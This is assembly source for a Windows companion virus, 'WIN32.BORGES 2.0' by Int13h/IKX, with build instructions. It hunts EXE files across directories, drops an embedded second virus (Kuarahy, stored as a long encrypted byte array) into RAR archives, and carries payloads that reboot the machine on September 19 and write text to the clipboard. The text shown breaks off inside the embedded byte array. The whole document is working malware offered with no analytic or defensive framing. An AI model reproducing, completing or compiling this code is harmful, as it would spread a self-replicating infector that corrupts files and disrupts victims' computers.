;                                                                      ;
; ------------> WIN32.BORGES Virus ver 2.0 by Int13h/IKX <-------------;
; EXE  Companion  with  directory navigation. It drops a virus over RAR;
; archives.  On  setember 19 reboots the machine and on tuesdays puts a;
; text in the clipboard. ­Jorge Luis Borges se merec¡a el Premio Nobel!;
;                       PUTRIDO SUECO COMITE NOBEL                     ;
; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - cd13- -;
;                                                                      ;
; COMPILATION:                                                         ;
; tasm32 /ml /m3 borges.asm,,;                                         ;
; tlink32 /Tpe /aa /c /v borges.obj,,, import32.lib,                   ;
;

.386
.model flat
locals

        extrn   FindFirstFileA:PROC
        extrn   FindNextFileA:PROC
        extrn   SetCurrentDirectoryA:PROC
        extrn   GetCurrentDirectoryA:PROC
        extrn   GetSystemTime:PROC
        extrn   MoveFileA:PROC
        extrn   CopyFileA:PROC
        extrn   CreateFileA:PROC
        extrn   WriteFile:PROC
        extrn   SetFilePointer:PROC
        extrn   CloseHandle:PROC
        extrn   GlobalAlloc:PROC
        extrn   GlobalLock:PROC
        extrn   GlobalUnlock:PROC
        extrn   OpenClipboard:PROC
        extrn   SetClipboardData:PROC
        extrn   EmptyClipboard:PROC
        extrn   CloseClipboard:PROC
        extrn   GetTickCount:PROC
        extrn   GetCommandLineA:PROC
        extrn   CreateProcessA:PROC
        extrn   lstrcpyA:PROC
        extrn   MessageBoxA:PROC
        extrn   ExitWindowsEx:PROC
        extrn   ExitProcess:PROC
   HeaderSize   equ FinRARHeader-RARHeader
         Size   equ 4774

.DATA

TituloVentana   db 'WIN32.BORGES VIRUS 2.0 by Int13h/IKX',0
TextoVentana    db 'Made in Paraguay, South America',0
Posicion        dd 0
MemHandle       dd 0
FileHandle      dd 0
Chequeo         dd 0
Number          dd 0
Victimas        db '*.EXE',0
Victimas2       db '*.RAR',0

RARHeader:
RARHeaderCRC    dw 0
RARType         db 074h
RARFlags        dw 8000h
RARHeadsize     dw HeaderSize
RARCompressed   dd Size
RAROriginal     dd Size
RAROs           db 0
RARCrc32        dd 0
RARFileTime     db 063h,078h
RARFileDate     db 031h,024h
RARNeedVer      db 014h
RARMethod       db 030h
RARFnameSize    dw FinRARHeader-RARName
RARAttrib       dd 0
RARName         db "KUARAHY.EXE"
FinRARHeader    label byte


SearcHandle1    dd 0
SearcHandle2    dd 0
Longitud        dd 0
ProcessInfo     dd 4 dup (0)
StartupInfo     dd 4 dup (0)
Win32FindData   dd 0,0,0,0,0,0,0,0,0,0,0
Hallado         db 200 dup (0)
Crear           db 200 dup (0)
ParaCorrer      db 200 dup (0)
Original        db 200 dup (0)
Actual          db 200 dup (0)
PuntoPunto      db '..',0
SystemTimeStruc dw 0,0,0,0,0,0,0,0


Kuarahy2: ; Virus to drop: Kuarahy 1.1 com/exe/sys/obj/ovl/bat/arj/rar/bs/mbr
db 0ebh,03ch,090h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,0bfh,04dh,001h,0b9h,0d8h,000h,02eh,081h,035h,0feh,0d2h,047h,047h
db 0e2h,0f7h,07fh,0ech,0feh,0d2h,033h,0f2h,08bh,0d1h,017h,07ah,0ffh,0f9h,03eh
db 028h,070h,002h,042h,0d2h,082h,029h,002h,0c4h,0e1h,01fh,0ech,0ffh,0f2h,0d2h
db 05dh,0c1h,0fah,063h,0f8h,001h,01eh,05ch,03eh,06ch,0feh,0aeh,0cdh,02dh,047h
db 0d2h,0ffh,021h,05bh,06ah,0f7h,0d0h,045h,0d2h,0fch,0f4h,07eh,0ech,057h,0d2h
db 0b8h,0a6h,0f6h,06bh,0fdh,0d2h,044h,052h,0feh,039h,0fbh,06bh,0fch,082h,0d5h
db 000h,033h,0c1h,046h,0dbh,0fch,01fh,0edh,0a1h,0fdh,03bh,05bh,0d2h,0f8h,069h
db 052h,0d2h,0adh,019h,0b6h,081h,0feh,06ah,0deh,0d2h,016h,09ch,0ffh,0fch,038h
db 0d4h,055h,0d2h,0feh,0f4h,038h,0d4h,054h,0d2h,0adh,0f4h,038h,0d4h,04bh,0d9h
db 0b0h,073h,0b2h,0d2h,0d8h,071h,062h,0d3h,039h,0d4h,0b2h,0d2h,08fh,0d3h,05fh
db 09ch,0feh,0f4h,05dh,04ch,0ffh,05eh,0f8h,09ch,0feh,06ah,0ffh,0d0h,045h,064h
db 0ech,06bh,0ffh,0d2h,044h,052h,0feh,04eh,0d0h,02dh,0e0h,04eh,0ffh,0a0h,0a6h
db 0f4h,07fh,06dh,0b5h,0d2h,01ch,025h,08ah,09dh,0d8h,014h,0f8h,07bh,0feh,09ah
db 0e0h,0d4h,0e1h,0e1h,001h,06ah,0ffh,0d1h,045h,064h,0ech,06bh,0fch,0d2h,044h
db 052h,0feh,01fh,0edh,0fch,038h,0d4h,0ech,0deh,09ch,085h,0e0h,0d4h,043h,0ddh
db 0fch,03ah,049h,0d9h,0f9h,0cdh,0a1h,06ch,089h,0c2h,045h,0b1h,0ebh,03ah,0e2h
db 0ddh,046h,0dbh,0fdh,069h,09dh,0c5h,047h,0d1h,0feh,068h,07eh,0d2h,033h,0c1h
db 07dh,02dh,0deh,0a7h,0ffh,011h,0e1h,0f4h,038h,0d4h,057h,0d2h,0b8h,0f4h,07eh
db 0ech,057h,0d2h,0b8h,0a6h,0f6h,068h,07eh,0d2h,047h,0d0h,0feh,039h,0fbh,0e1h
db 02ch,06bh,0ffh,082h,0e0h,0d5h,045h,0d2h,082h,06ah,0ffh,0d0h,033h,0c1h,046h
db 0d3h,0fch,01fh,0edh,038h,0feh,0aeh,0feh,0d2h,016h,08dh,0f3h,0efh,0edh,01fh
db 08bh,0d1h,017h,0cbh,0f3h,052h,002h,0d1h,08bh,0d1h,017h,0d3h,0f5h,052h,002h
db 0d0h,08bh,0c0h,07dh,02bh,0ffh,0a7h,0f3h,057h,02ch,0a7h,0fdh,03bh,0a4h,0dfh
db 07fh,028h,07eh,0d2h,08ah,0d7h,014h,0d2h,0feh,0d2h,0feh,083h,04fh,0d0h,033h
db 0c1h,0a7h,018h,0fch,0d2h,0aeh,083h,0ach,06ah,0ffh,0d0h,0cdh,000h,047h,0d3h
db 0aeh,04eh,0d0h,02dh,0e0h,04eh,0ffh,06ah,0ffh,0d0h,062h,0fch,001h,0cch,062h
db 0d3h,0a4h,08bh,0a6h,018h,0fch,0d2h,0deh,0ech,0b5h,087h,0bfh,080h,0bfh,09ah
db 0a7h,0eeh,0deh,0f2h,0b5h,0bdh,09fh,0f2h,096h,0b3h,0d9h,0b7h,0deh,09bh,090h
db 0a6h,0cfh,0e1h,096h,0fdh,0b7h,099h,0a6h,0f2h,08ch,0b7h,093h,0b0h,097h,0b3h
db 08eh,0bdh,095h,0a7h,07ch,0f2h,096h,0bbh,090h,0b3h,0dfh,0f2h,0c4h,0fbh,020h
db 055h,0aah,0beh,00fh,003h,0b9h,04bh,008h,02eh,081h,034h,038h,03ch,046h,046h
db 0e2h,0f7h,005h,01ch,038h,049h,039h,0ffh,0d0h,03ch,038h,061h,0b9h,0d1h,020h
db 03eh,016h,0bch,086h,02eh,034h,06fh,04dh,03fh,0d1h,03dh,03eh,084h,02bh,0f1h
db 0f5h,01dh,005h,0f1h,02bh,049h,03bh,0d5h,0e9h,03ch,03eh,084h,019h,009h,0f5h
db 01dh,016h,0b5h,0a6h,0e7h,03ch,012h,0b4h,0bah,0e5h,038h,016h,0b5h,0a6h,02fh
db 034h,012h,0b4h,0bah,02dh,030h,026h,0f9h,026h,03ah,038h,0bch,007h,0d6h,04dh
db 022h,0fdh,063h,039h,0bdh,007h,0ach,0a8h,049h,0cah,0bfh,0d3h,00eh,0b9h,003h
db 0a8h,0ach,04dh,030h,016h,0b5h,0a6h,02fh,034h,012h,0b4h,0a2h,02dh,030h,0d3h
db 033h,0b9h,003h,026h,012h,04dh,035h,0bbh,0ffh,01dh,0bdh,007h,0c6h,0b8h,048h
db 0ddh,023h,080h,02fh,0f5h,0f1h,02bh,001h,0f5h,02fh,04dh,015h,06bh,03bh,036h
db 023h,0b5h,08ah,0e3h,038h,087h,0e7h,03ch,099h,09dh,0b1h,08eh,02fh,034h,083h
db 02bh,030h,09dh,099h,00bh,0fch,0b6h,0fch,0c2h,083h,0bch,03ch,080h,0adh,03ch
db 097h,0b3h,0ffh,093h,0c7h,03fh,0d7h,074h,0b0h,0e0h,074h,0b6h,0fch,01eh,09dh
db 03bh,03ch,015h,0f9h,03ah,0afh,026h,03bh,08ch,076h,0f5h,01dh,08ch,074h,083h
db 0f8h,03ah,0f1h,019h,074h,0b6h,0fch,01eh,0fbh,03eh,03dh,038h,034h,038h,01ah
db 0ffh,03ah,030h,03ch,041h,077h,078h,0b2h,0f8h,00fh,0c7h,032h,027h,0b1h,08eh
db 03ch,038h,085h,003h,010h,0cbh,098h,01eh,0fah,03eh,089h,033h,072h,03eh,023h
db 080h,01dh,01dh,086h,0a9h,038h,0f5h,01dh,03fh,084h,0c6h,0f6h,0f5h,01dh,0b8h
db 082h,02ah,030h,07bh,048h,052h,0bch,086h,02eh,034h,07eh,04dh,03fh,0d1h,041h
db 038h,0bch,086h,02eh,034h,073h,04dh,03fh,0d1h,037h,039h,00fh,0c7h,0bch,086h
db 02eh,034h,07dh,04dh,03fh,0d1h,011h,039h,0bch,086h,02eh,034h,06eh,04dh,03fh
db 0d1h,01fh,039h,088h,012h,0f1h,019h,0bch,0c2h,031h,04dh,031h,087h,01ch,038h
db 03ah,06dh,0d4h,02ah,03dh,065h,03bh,0a9h,0f1h,02eh,03ah,027h,0b7h,0e5h,0b0h
db 0f8h,039h,028h,03ch,016h,03dh,0bfh,04ah,03bh,0c6h,016h,03fh,0bfh,046h,03bh
db 0b2h,0e8h,012h,0b3h,09bh,040h,03fh,0c3h,0d4h,021h,03ch,0d3h,03ch,0d2h,02ch
db 038h,03ch,038h,02ch,038h,059h,03fh,0d4h,0dbh,034h,0b5h,08ah,0cfh,037h,087h
db 03ch,039h,06bh,0c4h,098h,09dh,00fh,0f8h,017h,0e3h,00fh,0f1h,017h,0eah,00fh
db 0ceh,017h,0c7h,00fh,0d5h,0ffh,0d0h,0fah,030h,09dh,014h,03ch,0b4h,0b2h,089h
db 02ch,0b4h,0b2h,08dh,02ch,0b1h,0bah,091h,02ch,0b4h,0b2h,095h,02ch,0b6h,03ah
db 014h,03ch,013h,0fch,087h,03dh,038h,073h,097h,049h,0c4h,07bh,07fh,03ah,027h
db 032h,03fh,0b7h,0cfh,0b1h,086h,070h,02ah,085h,0b8h,03ch,0cbh,098h,036h,032h
db 027h,03bh,012h,0fch,0b5h,082h,074h,02eh,081h,041h,038h,0ceh,096h,0fbh,07dh
db 0c0h,07ah,07dh,0feh,079h,0c6h,068h,086h,0bch,038h,073h,0b2h,032h,0b8h,03ch
db 00ah,0d1h,0c6h,0fdh,086h,0bdh,038h,0cfh,09ch,0b1h,08eh,074h,02ah,083h,0b8h
db 03ch,094h,000h,035h,048h,03bh,096h,0d3h,0c4h,092h,0bdh,0d7h,0bdh,038h,0b7h
db 0f7h,0b4h,036h,0bch,038h,0c6h,084h,04ch,02fh,0c7h,08ch,076h,083h,018h,03ah
db 0f1h,019h,0b1h,0aeh,08bh,028h,084h,038h,077h,0b5h,0a2h,091h,02ch,0f5h,01dh
db 08ch,071h,0f5h,01dh,08ch,070h,0f5h,01dh,0d0h,012h,030h,0b1h,08eh,068h,03ch
db 083h,038h,0c6h,0b3h,0fbh,081h,039h,038h,0cfh,09dh,098h,0b5h,08ah,09eh,02eh
db 087h,03ch,039h,06bh,081h,05ch,0d2h,00fh,0e3h,00fh,0eah,0c3h,0d8h,0cfh,09ch
db 00fh,0ceh,017h,0c7h,00fh,0f8h,017h,0f1h,0ffh,0d0h,03ch,030h,088h,031h,0b1h
db 0aeh,068h,033h,0f1h,019h,085h,022h,03ch,0b5h,08ah,0eeh,02ch,0b3h,0d2h,082h
db 07dh,038h,06dh,080h,03ch,029h,087h,038h,032h,081h,03dh,038h,0f1h,028h,07eh
db 0bbh,0f9h,036h,065h,0dah,0d1h,0bbh,0c3h,018h,049h,039h,0ffh,0f5h,01ch,0d0h
db 003h,032h,001h,02bh,0f1h,04dh,03fh,0d1h,0c5h,031h,001h,0c6h,0f6h,04dh,03fh
db 0d1h,060h,033h,0bch,0c4h,077h,04dh,03fh,0d1h,0b0h,038h,0bch,0c4h,06ah,04dh
db 03fh,0d1h,0b8h,038h,0bch,0c4h,07fh,04ch,043h,0a8h,0ach,0a8h,0bch,0c4h,001h
db 04ch,04bh,005h,03ch,054h,048h,04ah,001h,019h,009h,04ch,028h,005h,01dh,01dh
db 048h,022h,001h,038h,06bh,04ch,07bh,005h,03dh,06fh,048h,023h,0d6h,035h,07dh
db 022h,03ch,016h,0b7h,026h,0e7h,03ch,012h,0b6h,03ah,0e5h,038h,0f7h,012h,0b1h
db 02ah,0e3h,038h,016h,0b0h,026h,0e1h,03ch,0f3h,06ah,06dh,080h,03ch,06fh,0a0h
db 016h,0c3h,026h,02fh,034h,0bch,0d9h,023h,0b8h,0c5h,026h,049h,030h,065h,0b8h
db 0ddh,0d8h,0bch,0f1h,022h,069h,065h,062h,084h,039h,06bh,0a4h,012h,0c7h,022h
db 02bh,030h,0f7h,0a0h,016h,0c3h,026h,02fh,034h,06dh,0b8h,0ddh,027h,0bch,0c1h
db 022h,04dh,034h,061h,0bch,0d9h,0dch,0b8h,0f5h,039h,06dh,061h,0f3h,088h,03fh
db 0f7h,0a0h,068h,06fh,069h,06eh,06eh,06bh,06dh,022h,03eh,001h,038h,050h,04dh
db 036h,0bbh,0c6h,039h,048h,03bh,0d5h,0a8h,03eh,0b3h,0eah,06ah,022h,080h,018h
db 00dh,0f1h,019h,012h,0b1h,022h,092h,02eh,016h,0b0h,03eh,090h,02ah,032h,027h
db 084h,01ch,019h,082h,009h,03dh,0f1h,019h,023h,062h,012h,0b1h,02ah,096h,02eh
db 016h,0b0h,026h,08ch,02ah,0b0h,0e3h,022h,03fh,0c0h,0b3h,0c6h,081h,0bch,038h
db 08ch,016h,0ceh,096h,048h,03bh,0d5h,070h,03eh,01eh,0b7h,07dh,0c1h,035h,01ch
db 018h,001h,056h,058h,04dh,03fh,0d1h,005h,03ah,001h,059h,052h,04dh,03fh,0d1h
db 00dh,03ah,001h,059h,04ah,04dh,03fh,0d1h,015h,03ah,001h,057h,048h,04dh,03fh
db 0d1h,01dh,03ah,001h,04ah,058h,04dh,03fh,0d1h,025h,03ah,001h,04ah,049h,04dh
db 03fh,0d1h,02dh,03ah,001h,051h,048h,04dh,03fh,0d1h,035h,03ah,001h,04eh,04ch
db 04dh,03fh,0d1h,03dh,03ah,001h,051h,052h,04dh,03fh,0d1h,0c5h,039h,001h,054h
db 04ch,04dh,03fh,0d1h,0cdh,039h,032h,03fh,082h,08eh,028h,0bfh,0cbh,09dh,098h
db 0d0h,048h,03eh,0d4h,0dah,03bh,04bh,03fh,0d1h,0e1h,039h,084h,038h,001h,0a4h
db 012h,0c7h,022h,02bh,030h,04bh,03fh,0d1h,0f3h,039h,0afh,036h,023h,0feh,03ah
db 091h,03ch,070h,03ah,06bh,084h,018h,02eh,0f5h,013h,080h,02ah,02ah,00eh,0c7h
db 01ah,0b2h,021h,0f5h,013h,01eh,0b6h,075h,038h,0b0h,032h,090h,02eh,01eh,0fah
db 07dh,038h,018h,01ah,0feh,079h,03ah,03eh,0b1h,002h,08ah,02eh,0b4h,03ah,08ch
db 02eh,063h,03bh,080h,03dh,07bh,086h,045h,02ch,013h,0f5h,0a4h,012h,0c7h,022h
db 02bh,030h,08ch,07dh,082h,041h,028h,0f1h,019h,088h,079h,086h,0b2h,02ch,0f5h
db 01dh,08ch,07dh,082h,0a9h,028h,0f1h,019h,088h,079h,086h,099h,02ch,0f5h,01dh
db 080h,03ch,06fh,0a0h,0c7h,022h,02bh,030h,0b1h,032h,018h,030h,0b1h,02ah,011h
db 030h,0b1h,02ah,0bah,02eh,0b8h,0ddh,027h,0bch,0c1h,022h,04dh,03fh,0d1h,06dh
db 039h,088h,007h,085h,015h,03ch,082h,08ah,02ch,0f1h,019h,0b7h,0cah,0b7h,03ch
db 0d5h,050h,038h,06bh,088h,008h,0f1h,019h,067h,004h,03bh,04ah,03fh,0d1h,013h
db 039h,0d4h,08eh,039h,0bdh,0eeh,04ch,03fh,0d1h,019h,039h,001h,0a8h,0deh,04eh
db 03fh,0d1h,021h,039h,001h,0a2h,03eh,04fh,03fh,0d1h,029h,039h,0bdh,044h,037h
db 06fh,068h,04dh,03fh,0d1h,037h,039h,083h,0cfh,037h,09dh,098h,015h,03fh,038h
db 09fh,08fh,037h,0b3h,0d4h,0b9h,0f9h,02ah,03fh,0d0h,03ch,03eh,085h,09eh,02eh
db 082h,05fh,02dh,088h,078h,0f1h,019h,0d4h,057h,039h,08ch,07ch,081h,03fh,038h
db 086h,08eh,037h,0f5h,01dh,0d1h,0ebh,038h,0bch,006h,02eh,034h,06fh,04dh,03fh
db 0d1h,0efh,038h,0bfh,044h,024h,078h,04eh,03bh,0d5h,0f2h,03ch,0bbh,040h,022h
db 03ch,04ch,03fh,0d1h,0fdh,038h,0bdh,044h,017h,06fh,068h,04dh,03fh,0d1h,08bh
db 038h,0d4h,006h,039h,081h,03ch,03ah,0cbh,0c9h,037h,0eah,048h,039h,07ch,001h
db 068h,03ah,048h,03bh,0d5h,09ah,03ch,001h,078h,03ch,048h,03bh,0d5h,0a2h,03ch
db 0d0h,01dh,03dh,06fh,06ah,06ch,0fch,03ah,0f2h,028h,09bh,048h,03bh,0b0h,03eh
db 04ah,03bh,0f8h,03eh,0f8h,02ch,0b0h,03eh,044h,03bh,09fh,042h,03fh,099h,082h
db 02ch,08dh,03ch,0efh,0d8h,0afh,060h,066h,068h,06eh,013h,0ffh,0bbh,0e6h,038h
db 085h,028h,03ch,0cfh,0cdh,0b1h,02ah,0f2h,028h,0b3h,0d6h,09bh,0f0h,02ch,09fh
db 0fch,028h,0ffh,03ah,0feh,028h,038h,03ch,062h,064h,03dh,09ah,02ah,0bfh,0eah
db 03ch,089h,035h,068h,0efh,0d0h,0efh,0f2h,037h,0eah,0c5h,02bh,0ech,060h,0bch
db 0dch,03dh,0b1h,02ah,082h,028h,09bh,084h,02ch,09dh,0f8h,028h,0c0h,039h,013h
db 03dh,04ah,03fh,09bh,0fch,02ch,0fbh,03eh,0feh,02ch,0c3h,0c7h,067h,0b9h,0f9h
db 037h,03eh,0d0h,01ah,03dh,085h,09eh,02eh,08ch,07ch,082h,05fh,02dh,0f1h,019h
db 0d4h,0adh,038h,08ch,07ch,081h,026h,038h,086h,08eh,028h,0f5h,01dh,0d0h,077h
db 03ch,0d4h,025h,03fh,08ch,002h,0f5h,01dh,036h,023h,080h,018h,01dh,012h,0fdh
db 02ah,092h,02eh,0f5h,01dh,03fh,023h,065h,063h,066h,066h,061h,067h,060h,0a1h
db 016h,0c3h,016h,0e7h,03ch,0bch,006h,02eh,034h,06fh,04dh,0e6h,0b3h,078h,03eh
db 09fh,012h,034h,0d0h,067h,03ch,09fh,084h,028h,0b9h,03ah,084h,028h,038h,03eh
db 0b3h,0d4h,0b9h,0f9h,037h,03eh,0d0h,0f4h,03ch,085h,09eh,02eh,08ch,07ch,082h
db 05fh,02dh,0f1h,019h,0d4h,00fh,038h,08ch,07ch,081h,036h,038h,086h,08eh,028h
db 0f5h,01dh,0d3h,09ch,080h,070h,038h,06ch,06bh,06dh,06ah,06ah,03eh,022h,036h
db 032h,027h,03bh,080h,02fh,0f5h,0f1h,02bh,001h,0f5h,02fh,04ch,075h,080h,03dh
db 03ah,0b1h,0a6h,09ah,02ah,085h,039h,03ch,082h,0bch,038h,0f1h,02bh,01ah,0b9h
db 083h,073h,03ch,0dah,0cbh,04ch,00dh,080h,03dh,03bh,085h,03ah,03ch,0f5h,02fh
db 01eh,0fbh,0beh,035h,03ah,03ch,038h,0b7h,0cdh,06ah,0b9h,0fah,007h,03ch,0ffh
db 038h,075h,040h,063h,0b1h,08eh,04bh,028h,0d4h,0f6h,03bh,080h,035h,03bh,0b1h
db 0a6h,03ch,03ah,085h,03bh,03ch,082h,0bch,038h,0f1h,02bh,088h,03ch,0f1h,022h
db 0bch,0c2h,02fh,04dh,020h,0d0h,03ch,038h,067h,0b9h,0d7h,0aeh,034h,0b5h,08bh
db 06ch,037h,081h,076h,038h,090h,013h,0e7h,08ch,032h,0f5h,02ch,0dah,0cbh,00bh
db 0fch,0f5h,02ah,027h,03bh,066h,066h,061h,067h,013h,0fch,0fbh,0bch,006h,02eh
db 034h,073h,04ch,03fh,0d1h,031h,0c7h,0d4h,0b7h,03fh,00bh,0c3h,0d0h,0bfh,03dh
db 000h,098h,048h,023h,000h,09ah,048h,02fh,000h,0b2h,048h,058h,000h,0b4h,049h
db 03bh,0d5h,0cah,0c2h,080h,03dh,07ah,00fh,0f1h,0f1h,019h,04fh,0d9h,0d5h,0deh
db 0c2h,06ah,084h,039h,07eh,013h,0f5h,0a1h,0f1h,019h,06eh,068h,088h,007h,085h
db 03bh,03ch,082h,079h,02ah,0f1h,019h,037h,0c7h,049h,029h,07bh,0b9h,002h,07eh
db 02eh,038h,03dh,04ch,034h,0c2h,0bfh,0fch,03ah,0c3h,0d5h,084h,0c2h,0b9h,03ah
db 07eh,02eh,09eh,02eh,062h,065h,069h,06eh,080h,03ch,07ah,0f1h,019h,088h,078h
db 086h,07dh,02eh,081h,03fh,038h,0f1h,019h,066h,061h,084h,038h,07eh,0f5h,01dh
db 062h,0d7h,09fh,085h,0c7h,0c3h,082h,0c1h,0c7h,084h,039h,07eh,0f5h,01dh,081h
db 03ah,038h,086h,0e8h,02ch,08ch,07ch,0f5h,01dh,085h,033h,03bh,0d4h,0bfh,03fh
db 08ch,07ch,081h,09ah,02ah,086h,05bh,029h,0f5h,01dh,08ch,07ch,081h,036h,038h
db 086h,0feh,02ch,0f5h,01dh,0d1h,05dh,0c6h,0d4h,094h,03eh,03eh,0d4h,045h,03dh
db 03fh,088h,006h,0f1h,019h,012h,0fdh,00ah,096h,02eh,087h,0dfh,02ch,0b7h,0efh
db 085h,0b8h,03ch,094h,000h,016h,048h,03bh,096h,0dah,0c4h,092h,032h,027h,0fbh
db 03dh,07fh,077h,0fbh,07dh,03eh,075h,03ch,08ch,000h,081h,01ch,038h,0f1h,019h
db 04fh,03bh,0d5h,00ah,0c2h,0abh,06eh,085h,033h,03bh,0d4h,017h,03fh,081h,09ah
db 02ah,088h,078h,086h,05bh,029h,0f5h,01dh,08ch,002h,0f5h,01dh,062h,06eh,080h
db 03eh,005h,0a0h,016h,0c3h,026h,02fh,034h,0afh,0d0h,06dh,03ah,088h,006h,0f1h
db 019h,066h,080h,03dh,07bh,085h,01bh,03ch,0a4h,012h,0c7h,022h,02bh,030h,0d1h
db 0c5h,0c5h,072h,071h,074h,071h,070h,018h,07dh,06bh,06fh,07dh,071h,07ah,070h
db 07dh,06eh,018h,071h,079h,075h,06dh,06fh,019h,001h,06bh,05dh,04ch,03fh,0d1h
db 0ebh,0c5h,0d4h,05fh,03eh,087h,050h,02ah,085h,03ch,03ch,0d0h,003h,039h,081h
db 037h,03fh,0d0h,0f2h,03ah,084h,03ah,07eh,0a1h,00fh,0f1h,0f1h,019h,082h,05bh
db 029h,081h,09ah,02ah,0d4h,07ch,038h,0b1h,02ah,066h,02eh,09bh,060h,02ah,082h
db 076h,02eh,081h,01ah,038h,0d4h,00ch,038h,09bh,070h,02ah,088h,078h,086h,074h
db 02eh,081h,014h,038h,0f1h,019h,0fbh,03eh,070h,02ah,03ch,038h,0fbh,03eh,060h
db 02ah,03ch,038h,0fbh,03eh,062h,02ah,03ch,038h,086h,05bh,029h,081h,09ah,02ah
db 088h,078h,0f1h,019h,0d5h,04ah,0c1h,0d0h,034h,03ah,083h,0aeh,02eh,081h,038h
db 038h,0d4h,0d8h,03ch,085h,033h,03bh,0d4h,057h,03eh,080h,03eh,07ah,00fh,0f1h
db 0a5h,0f5h,01dh,0bfh,0f6h,0b3h,0ech,0bbh,0d6h,03ch,0bfh,0e1h,03dh,0bbh,0fdh
db 039h,084h,038h,07eh,0f5h,01dh,086h,05fh,02dh,085h,09eh,02eh,0d0h,0efh,03bh
db 09fh,0b4h,02eh,0b1h,02ah,0b6h,02eh,08ch,07ch,081h,01eh,038h,086h,04ch,02eh
db 0f5h,01dh,081h,014h,038h,082h,040h,02eh,0d0h,085h,03bh,09fh,098h,02eh,0b1h
db 02ah,09ah,02eh,08ch,07ch,081h,02ch,038h,086h,0aeh,02eh,0f5h,01dh,0ffh,03ah
db 0b4h,02eh,038h,03ch,0ffh,03ah,0b6h,02eh,038h,03ch,0ffh,03ah,098h,02eh,038h
db 03ch,0ffh,03ah,09ah,02eh,038h,03ch,08ch,07ch,081h,09ah,02ah,086h,05bh,029h
db 0f5h,01dh,0ffh,03ah,04eh,02eh,038h,03ch,08ch,07ch,081h,038h,038h,086h,04ch
db 02eh,0f5h,01dh,0d1h,0e1h,0c4h,012h,0fch,002h,08ah,02eh,016h,0b6h,036h,094h
db 02ah,01ah,0b0h,071h,03ch,0ffh,005h,071h,062h,049h,03bh,0d5h,0d7h,0c7h,005h
db 066h,075h,049h,03bh,0d5h,0dfh,0c7h,0b8h,002h,02ah,030h,07bh,049h,03bh,0d5h
db 046h,0c7h,004h,0bch,04dh,03fh,0d1h,0a0h,0c5h,07ch,04dh,03fh,0d1h,0f0h,0c4h
db 0bch,006h,02eh,034h,07eh,04dh,03fh,0d1h,000h,0c6h,0bch,006h,02eh,034h,07dh
db 04dh,03fh,0d1h,01dh,0c7h,0bch,006h,02eh,034h,06eh,04dh,03fh,0d1h,08ch,0c6h
db 0d5h,0b4h,0c0h,069h,085h,021h,03ch,0d0h,021h,039h,039h,078h,03ch,092h,065h
db 0dah,0ceh,0fbh,035h,038h,031h,032h,01ch,063h,077h,06dh,07dh,06ah,07dh,070h
db 065h,018h,00dh,016h,00dh,018h,05eh,041h,01ch,071h,052h,04ch,00dh,00bh,054h
db 017h,075h,073h,064h,065h,01ch,015h,01ch,06fh,04eh,051h,048h,04ch,059h,056h
db 01ch,051h,052h,018h,06ch,059h,04eh,059h,05bh,04dh,05dh,041h,01ch,015h,01ch
db 068h,050h,05dh,05dh,04bh,059h,018h,04eh,05dh,05bh,051h,04fh,04ch,059h,04ah
db 01dh,018h,031h,032h,018h,07ch,073h,06bh,01ch,071h,052h,05eh,059h,05bh,048h
db 051h,053h,056h,01ch,075h,05dh,05bh,054h,051h,052h,05dh,03eh,061h,0d5h,087h
db 033h,018h,070h,05dh,05dh,04ah,052h,018h,04fh,057h,051h,05dh,01ch,05fh,049h
db 059h,04eh,059h,052h,099h,01ch,04fh,053h,04ah,058h,04bh,01dh,002h,077h,04dh
db 05dh,04ah,05dh,050h,045h,005h,06fh,04dh,052h,018h,01ch,079h,098h,098h,001h
db 07ch,059h,04eh,055h,054h,01ch,018h,077h,04dh,098h,098h,001h,06fh,053h,055h
db 05dh,056h,01ch,086h,074h,037h,059h,040h,059h,05bh,053h,055h,04fh,041h,04fh
db 057h,05eh,052h,05eh,059h,048h,057h,04ah,054h,05dh,04ah,056h,04ah,05dh,04ah
db 06eh,035h,07dh,022h,03ch,016h,0c3h,03eh,06eh,033h,084h,039h,06bh,081h,00bh
db 046h,0bch,0d9h,0dch,0b8h,0f5h,026h,086h,0b9h,019h,0a4h,012h,0c7h,022h,02bh
db 030h,0fbh,01ch,07dh,011h,055h,05dh,051h,050h,018h,051h,05dh,006h,018h,075h
db 056h,048h,009h,00fh,050h,07ch,059h,052h,04ch,055h,04bh,053h,05bh,055h,059h
db 050h,016h,05fh,057h,051h,018h,084h,038h,07eh,0d3h,03fh,080h,03eh,07ah,00fh
db 0f1h,0a5h,0f5h,01dh,0fbh,032h,036h,023h,03fh,0ffh,06ah,06bh,0ddh,07ch,082h
db 056h,038h,0cbh,0dah,039h,03bh,039h,087h,087h,02fh,0bfh,0eah,03ch,0cfh,0cbh
db 0b3h,0feh,0cfh,0ddh,0cfh,0cbh,067h,066h,078h,0ffh,016h,0bch,006h,096h,038h
db 06fh,04dh,074h,016h,0c2h,03eh,097h,038h,012h,0b8h,002h,093h,03ch,030h,04ah
db 003h,022h,068h,06fh,00bh,0fch,0b6h,0e4h,099h,0b8h,038h,0b7h,026h,0bah,038h
db 012h,09bh,0e7h,03ch,012h,0b1h,022h,0e5h,038h,016h,09fh,02bh,030h,016h,0b5h
db 026h,029h,034h,0c6h,0ffh,03ah,0bch,03ch,0a9h,038h,0b4h,032h,0beh,03ch,0c3h
db 012h,0feh,03ah,093h,03ch,038h,012h,0feh,03ah,092h,03ch,076h,067h,060h,023h
db 0d1h,0ffh,0cch,0d4h,0bfh,0c3h,0b1h,012h,039h,03eh,0b9h,0d1h,0fah,03dh,0b1h
db 012h,007h,03ch,0dch,07ch,0beh,0dch,0dch,07ch,09bh,035h,03ah,00fh,0ceh,083h
db 05bh,029h,081h,007h,014h,0cfh,09ch,082h,04ah,02bh,099h,035h,03ah,085h,073h
db 034h,009h,038h,07eh,07ah,0dah,0c6h,0dch,07ch,0beh,0dch,0dch,07ch,09bh,07bh
db 038h,085h,014h,03dh,0d0h,073h,0c7h,083h,07dh,03ch,005h,058h,038h,04bh,037h
db 08dh,039h,084h,0b9h,008h,093h,083h,081h,031h,080h,00dh,03ch,097h,0d3h,01dh
